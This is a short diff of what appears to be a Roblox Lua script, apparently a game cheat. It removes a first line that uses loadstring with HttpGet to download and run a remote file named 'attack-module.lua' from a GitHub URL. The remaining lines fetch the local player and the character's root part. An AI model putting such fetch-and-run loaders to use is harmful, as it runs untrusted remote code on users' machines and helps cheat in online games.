@@ -1,4 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/TurboLite/Script/refs/heads/main/attack-module.lua"))()
 local Y = game.Players;
 local d = Y.LocalPlayer;
 local R = d.Character.HumanoidRootPart;
